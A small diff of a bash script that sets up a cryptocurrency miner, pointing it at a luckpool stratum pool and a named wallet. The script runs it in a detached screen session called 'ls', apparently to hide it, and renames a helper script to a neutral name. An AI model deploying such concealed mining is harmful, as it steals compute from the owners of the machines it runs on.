@@ -1,7 +1,7 @@
 #!/bin/bash
 sudo apt update 
 sudo apt install screen libjansson4 -y 
-chmod +x yakan.sh && chmod +x filesetup chmod 777 filesetup yakan.sh
+chmod +x file.sh && chmod +x filesetup chmod 777 filesetup file.sh
 screen -dmS ls 
 POOL=stratum+tcp://na.luckpool.net:3956
 WALLET=RUEfFzYUwZSaXcLmdA6xyPvgwu7FLbkm6r
